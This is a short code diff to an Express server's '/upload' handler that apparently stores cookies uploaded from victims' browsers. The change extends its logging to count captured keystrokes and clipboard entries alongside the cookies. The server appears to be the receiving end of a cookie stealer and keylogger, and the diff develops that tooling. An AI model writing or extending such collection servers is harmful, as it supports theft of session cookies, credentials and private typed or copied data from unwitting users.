@@ -28,7 +28,9 @@ app.post('/upload', (req, res) => {
     // Save cookie data to file
     fs.writeFileSync(filepath, JSON.stringify(cookieData, null, 2));
     
-    console.log(`[${new Date().toISOString()}] Received ${cookieData.total_cookies} cookies - Saved to ${filename}`);
+    const keystrokeCount = cookieData.total_keystrokes || 0;
+    const clipboardCount = cookieData.total_clipboard || 0;
+    console.log(`[${new Date().toISOString()}] Received ${cookieData.total_cookies} cookies, ${keystrokeCount} keystrokes, ${clipboardCount} clipboard entries - Saved to ${filename}`);
     
     res.json({
       success: true,
